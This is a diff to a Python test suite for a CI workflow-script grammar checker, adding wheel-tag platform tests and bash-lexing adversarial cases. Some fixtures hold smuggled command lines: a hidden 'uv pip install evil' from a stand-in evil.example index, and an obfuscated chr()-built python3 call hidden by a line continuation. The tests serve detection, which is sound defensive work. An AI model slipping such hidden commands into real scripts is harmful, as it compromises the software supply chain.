@@ -1107,6 +1107,24 @@ TRACKED_CONFIGURATION = {
             }
         ),
     },
+    # Sol r9 B2: the only Linux wheel needs a glibc no runner has.
+    "impossible_manylinux_wheel": {
+        "uv.lock": re.sub(
+            r"(annotated_types-0\.7\.0-)py3-none-any(\.whl)",
+            r"\1cp310-abi3-manylinux_2_999_x86_64\2",
+            (REPO_ROOT / "uv.lock").read_text(encoding="utf-8"),
+        ),
+    },
+    "no_build_package_incomplete": {
+        "pyproject.toml": (REPO_ROOT / "pyproject.toml")
+        .read_text(encoding="utf-8")
+        .replace('  "annotated-types",\n', "", 1),
+    },
+    "build_isolation_back_on": {
+        "pyproject.toml": (REPO_ROOT / "pyproject.toml")
+        .read_text(encoding="utf-8")
+        .replace("no-build-isolation = true", "no-build-isolation = false", 1),
+    },
     "package_manager": {
         "package.json": json.dumps(
             {
@@ -1149,6 +1167,33 @@ def test_every_pip_install_template_builds_nothing_from_the_index() -> None:
         "/tmp/smoke-venv/bin/pip install --no-deps --no-index dist/gpo_studio-*.whl",
     ):
         assert any(_match(t, tuple(unlocked.split())) is None for t in installs)
+
+
+WHEEL_TAGS = {
+    # Sol r9 B2, verbatim: a manylinux floor newer than any runner's glibc.
+    "cp310-abi3-manylinux_2_999_x86_64": set(),
+    "cp313-cp313-manylinux_2_39_x86_64": set(),  # newer than LINUX_GLIBC_FLOOR
+    "cp31-abi3-win_amd64": set(),  # abi3 begins at CPython 3.2
+    "cp313-cp313-manylinux_2_17_aarch64": set(),  # wrong architecture
+    "cp314-cp314t-manylinux_2_17_x86_64": set(),  # free-threaded ABI
+    "cp313-cp313-win32": set(),
+    "cp310-abi3-win_amd64": {("win", 13), ("win", 14)},
+    "cp313-cp313-manylinux_2_28_x86_64": {("linux", 13)},
+    "cp312-abi3-manylinux2014_x86_64": {("linux", 13), ("linux", 14)},
+    "py3-none-any": {("linux", 13), ("linux", 14), ("win", 13), ("win", 14)},
+}
+
+
+@pytest.mark.parametrize("tag", sorted(WHEEL_TAGS))
+def test_a_wheel_counts_only_where_the_runner_would_install_it(tag: str) -> None:
+    """packaging.tags' rules, not a pattern: Sol r9 B2's impossible tags count nowhere."""
+    artifact = {"url": f"https://files.pythonhosted.org/x/demo-1.0-{tag}.whl"}
+    runs_on = {
+        target
+        for target in workflow_grammar._CI_TARGETS
+        if workflow_grammar._wheel_runs_on(artifact, *target)
+    }
+    assert runs_on == WHEEL_TAGS[tag]
 
 
 def test_every_locked_package_has_a_wheel_for_every_ci_platform() -> None:
@@ -1673,36 +1718,50 @@ _COMPUTED = re.compile(r"\$|^<\(")
 
 
 def _grammar_commands(script: str) -> list[tuple[str, ...]]:
-    """Every command the grammar found, word by word; an assignment as ("NAME=",)."""
+    """Every command the grammar found, word by word; an assignment as ("NAME=",).
+
+    A word bash computes is marked ``\0`` + its source: it stands for one traced word
+    (none if it expands to nothing), or any number for an array's ``[@]``.
+    """
     found: list[tuple[str, ...]] = []
     for command in split_commands(script):
         found.extend((_ASSIGNED.match(token)[1] + "=",) for token in command.assignments)  # type: ignore[index]
         if command.words:
-            found.append(tuple(command.words))
+            raw = command.raw[command.assigned :]
+            found.append(
+                tuple(
+                    "\0" + source if _COMPUTED.search(word) else word
+                    for word, source in zip(command.words, raw, strict=True)
+                )
+            )
             if command.words[0] == "trap" and len(command.words) > 2:
                 found.extend(_grammar_commands(command.words[1]))
     return found
 
 
-def _words_match(expected: tuple[str, ...], traced: list[str]) -> bool:
-    """Literal words must be equal; a computed word may expand to any number of words.
+def _words_match(expected: tuple[str, ...], traced: list[str], *, program: bool = True) -> bool:
+    """Literal words must be equal; a computed word stands for at most one traced word.
 
-    The program word is compared by its last path part when the directory is
-    computed (``"$TMPDIR/venv/bin/pip"`` is ``.../pip`` whatever TMPDIR holds).
+    The program word is exactly one traced word, compared by its last path part when
+    the directory is computed (``"$TMPDIR/venv/bin/pip"`` is ``.../pip``). Only an
+    array's ``[@]`` may stand for several words (Sol r9: a computed program word
+    once swallowed a whole hidden command line).
     """
     if not expected:
         return not traced
     head, rest = expected[0], expected[1:]
-    if _COMPUTED.search(head):
-        literal_tail = head.rsplit("/", 1)[-1] if "/" in head else ""
-        if literal_tail and not _COMPUTED.search(literal_tail):
-            return (
-                bool(traced)
-                and traced[0].rsplit("/", 1)[-1] == literal_tail
-                and _words_match(rest, traced[1:])
-            )
-        return any(_words_match(rest, traced[count:]) for count in range(len(traced) + 1))
-    return bool(traced) and traced[0] == head and _words_match(rest, traced[1:])
+    if head.startswith("\0"):
+        source = head[1:]
+        if program:
+            tail = source.strip('"').rsplit("/", 1)[-1] if "/" in source else ""
+            if not traced or (
+                tail and not _COMPUTED.search(tail) and traced[0].rsplit("/", 1)[-1] != tail
+            ):
+                return False
+            return _words_match(rest, traced[1:], program=False)
+        counts = range(len(traced) + 1) if "[@]" in source else range(min(2, len(traced) + 1))
+        return any(_words_match(rest, traced[count:], program=False) for count in counts)
+    return bool(traced) and traced[0] == head and _words_match(rest, traced[1:], program=False)
 
 
 def _bash_commands(script: str, directory: Path, environment: dict[str, str]) -> list[list[str]]:
@@ -1792,14 +1851,26 @@ def test_bash_runs_no_command_the_grammar_did_not_see(
         assert _unmatched(traced, expected) == [], where
 
 
+_MISREAD_UV = [("echo", '\0"$(...)"'), ("uv", "run", "--locked", "ruff", "check", ".")]
+_SOL_R9 = (
+    "echo \"$\\\n(python3 -c '__import__(chr(111)+chr(117)+chr(116)+chr(115)+chr(105)+chr(100)"
+    "+chr(101)+chr(95)+chr(108)+chr(111)+chr(99)+chr(107))' -I -m venv venv --clear)\"\n"
+    '"$PYTHON" -I -m venv "$TMPDIR/venv" --clear\n'
+)
 HIDDEN_BY_A_MISREAD = {
     # Sol r7 B1: a `)` on a comment line inside $(...).
-    "comment_paren": ('echo "$(\n# )\npip --version\n)"\n', "comment syntax", ["pip", "--version"]),
+    "comment_paren": (
+        'echo "$(\n# )\npip --version\n)"\n',
+        "comment syntax",
+        ["pip", "--version"],
+        _MISREAD_UV,
+    ),
     # DeepSeek r8 B1, verbatim: an escaped `)` inside a double-quoted $(...).
     "escaped_paren": (
         'echo "$(\necho hi \\)\nevilprog --install\n)"\n',
         "backslash escape",
         ["evilprog", "--install"],
+        _MISREAD_UV,
     ),
     # DeepSeek r8, the name-coincident payload a name-only comparison missed.
     "escaped_paren_same_program": (
@@ -1807,6 +1878,28 @@ HIDDEN_BY_A_MISREAD = {
         "uv run --locked ruff check .\n",
         "backslash escape",
         ["uv", "pip", "install", "evil", "--index-url", "https://evil.example/simple"],
+        _MISREAD_UV,
+    ),
+    # Sol r9 B1, verbatim: a continuation after `$` makes a substitution the old lexer
+    # never saw, and a computed program word once swallowed the hidden command line.
+    "continuation_synthesised_substitution": (
+        _SOL_R9,
+        "line continuation",
+        [
+            "python3",
+            "-c",
+            "__import__(chr(111)+chr(117)+chr(116)+chr(115)+chr(105)+chr(100)+chr(101)"
+            "+chr(95)+chr(108)+chr(111)+chr(99)+chr(107))",
+            "-I",
+            "-m",
+            "venv",
+            "venv",
+            "--clear",
+        ],
+        [
+            ("echo", '\0"$\n(...)"'),
+            ('\0"$PYTHON"', "-I", "-m", "venv", '\0"$TMPDIR/venv"', "--clear"),
+        ],
     ),
 }
 
@@ -1816,13 +1909,30 @@ HIDDEN_BY_A_MISREAD = {
 def test_the_bash_trace_sees_what_a_misreading_lexer_would_miss(name: str, tmp_path: Path) -> None:
     """The control: bash reaches the hidden command, the grammar refuses the script, and
     the word-for-word comparison flags it even against what a misreading lexer saw."""
-    script, refusal, hidden = HIDDEN_BY_A_MISREAD[name]
-    traced = _bash_commands(script, tmp_path, {})
+    script, refusal, hidden, misread = HIDDEN_BY_A_MISREAD[name]
+    traced = _bash_commands(script, tmp_path, {"PYTHON": "$PYTHON", "TMPDIR": "$TMPDIR"})
     assert hidden in traced
     with pytest.raises(workflow_grammar.GrammarError, match=refusal):
         split_commands(script)
-    misread = [("echo", '"$(...)"'), ("uv", "run", "--locked", "ruff", "check", ".")]
     assert hidden in _unmatched(traced, misread)
+
+
+def test_continuations_are_removed_as_bash_removes_them() -> None:
+    """Outside quotes exactly as bash does; inside quotes or expansions, refused."""
+    assert [c.words for c in split_commands("echo $\\\n(pip --version)\n")][0] == [
+        "pip",
+        "--version",
+    ]
+    assert [c.words for c in split_commands("echo a # comment \\\npip x\n")] == [
+        ["echo", "a"],
+        ["pip", "x"],
+    ]
+    assert [c.words for c in split_commands("uv lock \\\n  --check\n")] == [
+        ["uv", "lock", "--check"]
+    ]
+    for refused in ('echo "a\\\nb"\n', "echo $(true \\\n)\n", "echo ${X\\\n}\n", "echo $'x'\n"):
+        with pytest.raises(workflow_grammar.GrammarError):
+            split_commands(refused)
 
 
 def test_no_substitution_hides_in_an_echo_slot(tmp_path: Path) -> None:
